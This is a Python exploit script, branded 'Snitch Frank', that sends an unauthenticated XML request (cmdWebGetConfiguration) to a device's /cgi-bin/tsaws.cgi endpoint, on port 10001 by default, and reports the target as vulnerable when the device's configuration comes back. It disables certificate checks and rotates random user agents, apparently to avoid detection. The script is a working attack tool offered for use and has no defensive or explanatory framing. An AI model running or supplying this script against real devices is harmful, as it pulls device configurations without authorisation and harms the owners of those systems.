import sys
try: #catching user KeyboardInterrupt
    try: #catching ModuleNotFoundError
        import requests
        import argparse
        import re
        import linecache
        import random
        from urllib.parse import urlparse
        import urllib3
        urllib3.disable_warnings()
    except ModuleNotFoundError as e:
        print('[x]FATAL:'+str(e))
        sys.exit(1)
    


    def exploit(url, header, payload,verbose):
        print('-----------[FIRING PAYLOAD]-----------')
        r = requests.post(url,headers=header,data=payload,verify=False)
        resp = r.text
        pos_resp = re.search('<TSA_RESPONSE COMMAND="cmdWebGetConfiguration">',resp)

        if(verbose == True):
            print(resp)
        
        if(pos_resp):
            print('-----------[VULNERABLE]-----------')
        
        else:
            print('-----------[NOT VULNERABLE]-----------')

        
            

       
    

    def preexploit(url,ua,verbose):
        print('[+]Setting things up')
        
        #header settup
       
        
        header = {
                "Content-Type":"text/xml",
                "User-Agent":f"{ua}"
            }
        
        
        
        #url setup
        url = url+"/cgi-bin/tsaws.cgi"
        
        #setting up payload
        payload="""<TSA_REQUEST_LIST><TSA_REQUEST COMMAND="cmdWebGetConfiguration"/></TSA_REQUEST_LIST>"""
        
        exploit(url,header,payload,verbose)
       
        
    def get_rand_ua():
        #gets number of lines inside 'user-agents.txt' file
        with open(r"user-agents.txt", 'r') as fp:
            for count, line in enumerate(fp):
                pass
        linesinfile=count+1  
            

        #picks a randomized line number from within the file and reads what is the content of that line
        randomfileline = random.randint(0,linesinfile)
        line = linecache.getline(r"user-agents.txt", randomfileline)   
        splitter = line.split('\n')
        line=''.join(splitter[0])
        
        return line

    def main(details):
        print('Snitch Frank by > Klarine <') 
        print('!! Junkat$ on top !!')
        print()
        print('[+]-----------------------[+]')
        print()
        

        #Defining URL and port
        url = details.url
        port = details.port
        ua = details.user_agent
        verbose = details.verbose
        


        portcheck = urlparse(url).port
        if(portcheck != None and port != None):
            print('[x]FATAL: Port conflict. Port already set in URL.')
            sys.exit(1)

        if(portcheck != None and port == None):
            port = portcheck

        if(portcheck == None and port != None):
            port = port

        if(portcheck == None and port == None):
            port = 10001
        #Confirming if user target and port are correct
        isuaset = 0
        print('[?]Is this correct?')
        print('>Target: '+ url)
        print('>Port: '+str(port))
        if(ua != None):
            print('>User-Agent: '+ua)
            isuaset=1
        else:
            print('>User-Agent: Random')
            isuaset=0
        #waiting for confirmation
        confirm = input('(y/n)[Default y]: ').lower()
        
        #checking if confirmation length is greater than 1. If so, it will loop.
        while(len(confirm) > 1):
            confirm = input('(y/n)[Default y]').lower()
            if(len(confirm) == 1):
                break
        
        #checking if confirmation is either 'Yes' or 'No'. If none of these is selected, it will print out an error message.        
        if(len(confirm) > 0 and confirm != 'y' and confirm != 'n' ):
            print('[x]No such option')
            exit(1)

        #checks if target url has either 'HTTP' or 'HTTPS' schemes set. If not, fallback scheme setting will be 'HTTP'.
        try:
            find_scheme = re.search('http{1}s|http',url)
            scheme = find_scheme.group()
        except AttributeError as e:
            scheme = "http://"
            url=scheme+url
            
        
       
        #finds any path that the url may have and replaces it with blank to join vulnerable path in pre-exploit setup.
        find_path = urlparse(url).path
        replacer = url.replace(find_path,'')
        url = replacer
        
        
        
        #If no confirmation is inputted, default confirmation will be 'Yes' and the program will continue
        
        if(len(confirm) < 1):
            if(isuaset == 1):
                preexploit(url,ua,verbose)
            else:
                ua = get_rand_ua()
                preexploit(url,ua,verbose)
        
        if(confirm == "y"):
            if(isuaset == 1):
                preexploit(url,ua,verbose)
            else:
                ua = get_rand_ua()
                preexploit(url,ua,verbose)

        if(confirm == "n"):
            sys.exit(1)
            
            


    create_parser = argparse.ArgumentParser()
    create_parser.add_argument('-u','--url', type=str, required=True,help="*Required. Target URL")
    create_parser.add_argument('-p','--port', type=int, required=False,help="Optional. Target port. Default port at 10001")
    create_parser.add_argument('-ua','--user-agent', type=str, required=False,help="Optional. User-Agent header. Default randomized in user-agents.txt")
    create_parser.add_argument('-v','--verbose', required=False,action='store_true')
    arg = create_parser.parse_args()

    main(arg)
except KeyboardInterrupt as e:
    print('\n[!]Program interrupted by user.')
    sys.exit(1)
